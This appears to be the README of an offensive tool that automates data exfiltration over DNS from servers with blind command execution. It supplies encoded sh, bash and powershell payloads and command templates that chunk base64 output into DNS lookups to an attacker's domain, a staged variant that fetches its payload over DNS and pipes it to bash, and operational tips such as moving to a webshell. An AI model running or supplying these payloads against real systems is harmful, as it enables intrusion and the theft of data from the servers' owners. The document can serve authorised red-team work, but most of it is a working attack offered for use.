# Procrustes

A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script currently supports sh, bash and powershell and is compatible with exec style command execution (e.g. java.lang.Runtime.exec).

Unstaged:
<p align="center">
  <img width="680" src="images/op.gif"/>
</p>

Staged:
<p align="center">
  <img width="680" src="images/staged.gif"/>
</p>

For its operations, the script takes as input the command we want to run on the target server and transforms it according to the target shell in order to allow its output to be exfiltrated over DNS. After the command is transformed, it's fed to the "dispatcher". The dispatcher is a program provided by the user and is responsible for taking as input a command and have it executed on the target server by any means necessary (e.g. exploiting a vulnerability). After the command is executed on the target server, it is expected to trigger DNS requests to our DNS name server containing chunks of our data. The script listens for those requests until the output of the user provided command is fully exfiltrated.

Below are the supported command transformations, generated for the exfiltration of the command: `ls`

sh:
```bash
sh -c $@|base64${IFS}-d|sh . echo IGRpZyBAMCArdHJpZXM9NSBgKGxzKXxiYXNlNjQgLXcwfHdjIC1jYC5sZW4xNjAzNTQxMTc4LndoYXRldi5lcgo=
```

bash:
```bash
bash -c {echo,IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwNTYwLndoYXRldi5lcgo=}|{base64,-d}|bash
```

powershell:
```bash
powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsAMQB9AC4AewAyAH0AIgAgAC0AZgAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAoAGwAcwApACkAKQAuAGwAZQBuAGcAdABoACkALAAiAGwAZQBuACIALAAiADEANgAwADMAMAAzADAANAA4ADgALgB3AGgAYQB0AGUAdgAuAGUAcgAiACkACgA=
```

## Usage
1. Local testing for bash:
```bash
./procroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
```

2. Local testing for powershell with WSL2:
```bash
stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
```

3. powershell example where we ssh into our NS to get the incoming DNS requests.
```bash
./procroustes_chunked.sh -w ps -h yourdns.host -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
```

4. More information on the options
```bash
./procroustes_chunked.sh --help
```

### procroustes_chunked vs procroustes_full

In a nutshell, assuming we want to exfiltrate some data that has to be broken into four chunks in order to be able to be transmitted over DNS:
* procroustes_chunked: calls the dispatcher four times, each time requesting a different chunk from the server. It has relatively small payload size, it's fast and doesn't need any special configuration.
* procroustes_full: calls the dispatcher once, the command that will get executed on the server will be responsible for chunking the data and sending them over. It can have bigger payload size, it's fast (speed can be tuned through the -t parameter) and its speed can be further optimized when the dns_server is running on the name server.
* procroustes_full/staged: same as procroustes_full, but uses a stager to get the command used by procroustes_full to chunk the data. It has the smallest "payload" size but is also the slowest with regards to exfiltration rate since the actual payload is downloaded over DNS. For its operation it requires the creation of an nsconfig script. Note: the nsconfig script should be created only once per name server (and not per target server).

Some of their differences can also be illustrated through the template commands used for bash:

procroustes_chunked/bash:
```bash
%DNS_TRIGGER% `(%CMD%)|base64 -w0|cut -b$((%INDEX%+1))-$((%INDEX%+%COUNT%))'`.%UNIQUE_DNS_HOST%
```
procroustes_full/bash:
```bash
(%CMD%)|base64 -w0|echo $(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|awk '{printf "%s.%s%s\n",$1,NR,"%UNIQUE_DNS_HOST%"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%
```
procroustes_full/bash/staged:
```bash
(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash
```

---------------------------------------


|                       | procroustes_chunked                | procroustes_full  |  procroustes_full_staged  |
| -------------         |:-------------:               |:-----:         |:-----:         |
| payload size overhead (bash/powershell)  | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/800 (+CMD_LEN)       |   150/400[1]  |
| dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[2] |   1          |                1    |
| speed (bash/powershell)                | ✔/✔                         |  ✔/✔         | ✓/✓[3]|
| configuration difficulty                | easy                         |  easy+         | medium|

[1] For the staged version, the command is downloaded through DNS, so the listed size is the total payload size as well. 

[2] On procroustes_chunked, dispatcher is called multiple times and so as the provided command that is supposed to executed on the server (until all its output is exfiltrated). This behavior is not ideal in case the delivery of commands to the server (i.e. by calling the dispatcher) is time/resource intensive. 

It may also cause problems in case the command we are executing on the server is not idempotent (functionality or output-wise, e.g. "ls;rm file") or is time/resource intensive (e.g. find / -name secret). A workaround for this case is to first store the command output to a file (e.g. /tmp/file) and then use the script to read that file.

[3] In the staged version we have the overhead of the time required to get the actual payload over DNS. It should be noted that the script makes use of A records to get the actual payload. Even though this allows our traffic to blend in better with the regular traffic of the target environment, it offers limited channel capacity (e.g. 4 bytes per request). We could make use of other record types like TXT and minimize the stage download time (close to zero) and the stager size.

### Tips

 - You probably want to use this script as little as possible, try to transition to a higher bandwidth channel the soonest possible (e.g. HTTP-webshell)
 - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(setsid gunzip) -- 'ls -lhR / | gzip'
 - Another possibility for big/binary files is to copy them to a path which is accessible for example through HTTP
 - For increased exfil bandwidth in procrustes_full, run the dns_server on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk.
 - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger explicitly set to use our DNS server (e.g. dig @your_server whatev.er)

### Credits
* [Collabfiltrator](https://github.com/0xC01DF00D/Collabfiltrator) - idea of chunking the data on the server. It also performs similar functionalities with this script, so check it out.
* [DNSlivery](https://github.com/no0be/DNSlivery) - modified version of DNSlivery is used as the DNS server